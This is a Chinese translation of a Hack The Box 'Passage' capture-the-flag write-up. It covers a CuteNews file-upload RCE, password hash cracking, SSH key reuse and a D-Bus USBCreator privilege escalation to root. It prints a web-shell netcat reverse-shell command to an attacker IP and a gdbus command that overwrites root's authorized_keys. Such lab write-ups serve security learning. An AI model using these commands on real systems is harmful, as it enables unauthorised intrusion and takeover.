# HTB 文章

> 原文：<https://infosecwriteups.com/htb-passage-writeup-172490d4045e?source=collection_archive---------0----------------------->

## 无限制文件上传| RCE |弱密码| d-bus 漏洞

![](img/184f2da4eaf80d5db93b208009a6b7db.png)

## 列举

Nmap TCP 扫描输出

![](img/35f29c880d4e831eb00b0173d87e2a3f.png)

## 据点

**************端口 80 HTTP * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * ***

IP 在端口 80 上运行，并有一个网页。在主页面的底部，写着 powered by **CuteNews - PHP 新闻管理系统。**

![](img/a7eafc7e3add34e6761184d8a7776e6a.png)

在网址上输入‘cute news’，你会看到它的登录门户页面。

![](img/1147df27b7a11f0275c7211672182df1.png)

注意 CuteNews 版本 2.1.2，搜索[漏洞利用](https://www.exploit-db.com/exploits/48458)！

CuteNews 2.1.2 易受“阿凡达”远程代码执行的攻击

## 反向外壳

![](img/f32636877b1656f8363132e2dc7757a2.png)![](img/28604d959142c870e135e285997b8e7e.png)![](img/977922875e72dc77eb6ef882b7bca4cb.png)![](img/e346af8278a22bb657e6a8dbf7c9d3e1.png)![](img/9cf086978ccee55da7b596db263bd911.png)

`10.10.10.206/CuteNews/uploads/avatar_komz_avatar.php?cmd=nc 10.10.14.16 1234 -e “/bin/sh”`

![](img/e653ed8b748f815bccd4cac613e80ab3.png)![](img/ef5baafa603793f16bcecdeabc75d7ea.png)

在主目录下找到两个用户:nadav 和 paul。

![](img/ba338665bea046d2e4a22848ddd6ff32.png)

## 横向运动

在一些枚举之后，我发现一些哈希字符串是 base64 编码的。解码得到了我的散列码。

`locate user`

![](img/e7c7283b0cfa19ccccc7cf36dd31142a.png)

这里，users.txt 是空的。然而，在/users 文件夹中有几个 php 文件，在这些文件中可以找到 base64 哈希。

`cat *`一起检查这些 php 文件中的所有内容。

![](img/46f712e19de2292179a4d0befe38a5ed.png)

最后，在反复尝试破解密码后，一个散列泄露了 paul 的敏感数据，包括密码散列。

![](img/a9d81944b3c5c45907bf0cece469ee6e.png)

破解密码…

![](img/badfc4bbbd48aa0eff2d8aaa73eba07f.png)![](img/ac149d47e1ddce23abd57bdfaccbd00b.png)![](img/5f34e782649078ff7867551456cb942e.png)![](img/dc555a30d99e20b650f918458a1d7a76.png)

**成功了！！！**

# 通道根

## **权限提升**

注意下面保罗和纳达夫共享同一个 RSA 公钥；这意味着保罗的私人密钥可以用来登录为纳达夫。

![](img/9aa36e0bf058f4438d7a2567ed0a044c.png)

*确保复制的私钥的权限设置为‘600’*

*确保/etc/hosts 中包含“passage 或 passage.htb”以解析主机名。*

![](img/cbd355be9e34d7a652a9b9824a4a5fc8.png)

运行`id`我们可以看到，与保罗不同，纳达夫属于 **sudo** 组。

![](img/cad03eb36eccc1c9c37eb7242415164c.png)

接下来，搜索我们可以作为根权限执行的 **suid** 文件。

`find / -perm -u=s -type f 2>/dev/null`

在这里寻找最薄弱的环节。

![](img/387a02a76eef629d95ec1c735bedd2c2.png)

研究技术在这里起着非常关键的作用，否则你将会为一个非常具体的目标的正确利用而筋疲力尽。

搜索 **dbus-1.0 权限提升**，你会发现一种可以利用的技术。

![](img/d3ab594eecf7f95d020c7f61cff98c4c.png)![](img/26699ea4eb5983471ec1af1bf0829340.png)![](img/f63cc0773343dde48c0b2a42d72b3af5.png)

从针对 [d-bus 漏洞](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)的文章中，要求您修改命令，以便将 authorized_keys 文件中 nadav 的公共 rsa 密钥保存到 root 的 authorized _ keys 中以便登录。

`gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true`

![](img/f4a059173d30e4edec32e2df082a7c50.png)![](img/cd46dddb1241d44ac190f0456721d829.png)![](img/92f7fca8e6d32e2f758270937c156150.png)